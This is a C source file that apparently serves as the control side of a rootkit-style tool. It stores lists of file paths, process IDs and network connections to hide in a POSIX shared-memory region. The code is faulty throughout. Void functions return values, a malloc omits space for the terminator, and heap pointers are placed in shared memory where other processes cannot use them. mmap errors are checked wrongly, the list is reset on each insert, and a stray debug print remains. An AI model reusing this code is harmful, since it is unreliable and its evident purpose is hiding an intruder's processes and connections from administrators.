
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <netinet/in.h>
#include "list.h"

#define MAX_FILE_LENGTH 1024

#define SHM_NAME "/shm_name"

struct file_content {
    char file_name[MAX_FILE_LENGTH];
    char content[MAX_FILE_LENGTH];
};

typedef struct hide_file_{
    char *hide_file_paths;
}hide_file;

typedef struct hide_proc_{
    int pid;
    struct list_head node_hide_proc;
}hide_proc;

typedef struct hide_conn_{
    struct sockaddr_in addr;
    struct list_head node_hide_conn;
}hide_conn;

struct shm_data
{
    hide_file *file;
    hide_proc *proc;
    hide_conn *conn;
   /* data */
};



void update_file(char *hide_file_paths){
    int fd = shm_open(SHM_NAME,  O_RDWR, 0666);
    if (fd < 0) {
        perror("Error creating shared memory object");
        return -1;
    }

    ftruncate(fd, sizeof(struct shm_data));

    struct shm_data *shm_data_content = (struct shm_data *) mmap(NULL, sizeof(struct shm_data),
        PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

    if (shm_data_content == NULL) {
        perror("Error mapping shared memory object");
        return -1;
    }

    shm_data_content->file->hide_file_paths = (char *)malloc(strlen(hide_file_paths));

    strcpy(shm_data_content->file->hide_file_paths, hide_file_paths);

    munmap(shm_data_content, sizeof(struct shm_data));
    return 0;
}

void add_proc(int pid, int isHide)
{
    int fd = shm_open(SHM_NAME, O_RDWR, 0666);
    if (fd < 0) {
        perror("Error creating shared memory object");
        return -1;
    }
    
    
    ftruncate(fd, sizeof(struct shm_data));

    struct shm_data *shm_data_content = (struct shm_data *) mmap(NULL, sizeof(struct shm_data),
        PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

    if (shm_data_content == NULL) {
        perror("Error mapping shared memory object");
        return -1;
    }

    hide_proc *new_proc = (hide_proc *)malloc(sizeof(hide_proc));
    new_proc->pid = pid;

    INIT_LIST_HEAD(&shm_data_content->proc->node_hide_proc);
    list_add_tail(&new_proc->node_hide_proc, &shm_data_content->proc->node_hide_proc);
    munmap(shm_data_content, sizeof(struct shm_data));

    // hide_proc *proc = NULL;
    // list_for_each_entry(proc, &shm_data_content->proc->node_hide_proc, node_hide_proc) {
    //     printf("proc : %d\n", new_proc->pid);
    // }
    return 0;
}

int create_content() {
    int fd = shm_open(SHM_NAME, O_CREAT | O_EXCL | O_RDWR, 0666);
    if (fd < 0) {
        perror("Error creating shared memory object");
        return -1;
    }

    ftruncate(fd, sizeof(struct shm_data));

    struct shm_data *shm_data_content = (struct shm_data *) mmap(NULL, sizeof(struct shm_data),
        PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

    if (shm_data_content == NULL) {
        perror("Error mapping shared memory object");
        return -1;
    }

    shm_data_content->file = (hide_file*)malloc(sizeof(hide_file));
    shm_data_content->file->hide_file_paths = NULL;
    shm_data_content->proc = (hide_proc*)malloc(sizeof(hide_proc));
    shm_data_content->conn = (hide_conn*)malloc(sizeof(hide_conn));
    // memset(&shm_data_content->conn->addr, 0, sizeof(shm_data_content->conn->addr));

    munmap(shm_data_content, sizeof(struct shm_data));
    return 0;

}

char* read_content(char* name) {
    int fd = shm_open(name, O_RDWR, 0666);

    if (fd < 0) {
        perror("Error opening shared memory object");
        return NULL;
    }

    struct file_content *file = (struct file_content *) mmap(NULL, sizeof(struct file_content),
        PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

    if (file == NULL) {
        perror("Error mapping shared memory object");
        return NULL;
    }

    char* content = (char*) malloc(sizeof(char) * MAX_FILE_LENGTH);
    strcpy(content, file->content);

    munmap(file, sizeof(struct file_content));
    close(fd);

    return content;
}

int update_content(char* name, char* content) {
    int fd = shm_open(name, O_RDWR, 0666);

    if (fd < 0) {
        perror("Error opening shared memory object");
        return -1;
    }

    struct file_content *file = (struct file_content *) mmap(NULL, sizeof(struct file_content),
        PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

    if (file == NULL) {
        perror("Error mapping shared memory object");
        return -1;
    }

    strcpy(file->content, content);

    munmap(file, sizeof(struct file_content));
    close(fd);

    return 0;
}

int delete_content() {
    if (shm_unlink(SHM_NAME) == -1) {
        perror("Error removing shared memory object");
        return -1;
    }
    return 0;
}

int main() {

    int fd = shm_open(SHM_NAME,  O_RDWR, 0666);
    if (fd < 0) {
        perror("Error creating shared memory object");
        return -1;
    }

    ftruncate(fd, sizeof(struct shm_data));

    struct shm_data *shm_data_content = (struct shm_data *) mmap(NULL, sizeof(struct shm_data),
        PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

    if (shm_data_content == NULL) {
        perror("Error mapping shared memory object");
        return -1;
    }
    printf("11111111111111\n");
    printf("%s \n", shm_data_content->file->hide_file_paths);
    return 0;
}
